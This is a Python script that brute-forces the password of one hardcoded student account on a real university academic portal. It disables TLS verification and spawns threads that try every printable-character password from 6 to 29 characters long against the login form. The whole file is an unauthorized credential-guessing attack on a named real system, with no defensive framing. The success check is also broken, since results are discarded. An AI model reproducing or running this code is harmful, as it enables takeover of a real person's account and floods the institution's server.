import json
import asyncio
import requests
import aiohttp
import threading
import urllib3

urllib3.disable_warnings()

def requestlogin(password):
    url = "https://akad.unimed.ac.id/index.php"
    header = {
    "Host" : "akad.unimed.ac.id",
    "User-Agent" : "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Mobile Safari/537.36"
    }
    payload = {
        "usid" : "4203250014",
        "pwd" : "akuhebat123",
        "role" : "s",
        "action" : "login",
    }
    payload["pwd"] = password
    x = requests.post(url, data=payload, headers=header,verify=False)
    # print(x.url)
    if(x.url == "https://akad.unimed.ac.id/main.php"):
        return True

def getLettersList(start):
    elements = [*range(ord(start), 126)]
    elements.extend(range(32, ord(start)))
    return [chr(i) for i in elements]


def IteratePosition(len, index, text):
    if index == len - 1:
        for character in getLettersList(text[index]):
            text[index] = character
            pw = "".join(text)
            print(pw)
            requestlogin(pw)
    else:
        for character in getLettersList(text[index]):
            text[index] = character
            IteratePosition(len, index + 1, text)

def start(len,text):
    PASSWORDLENGHT = len
    text = list(text)
    IteratePosition(PASSWORDLENGHT,0,text)

t = {}
for i in range(6,30):
    t[i] = threading.Thread(target=start, args=(i," "*i))
    t[i].start()

for i in t:
    t[i].join()
# try:
# except:
#     print("something error")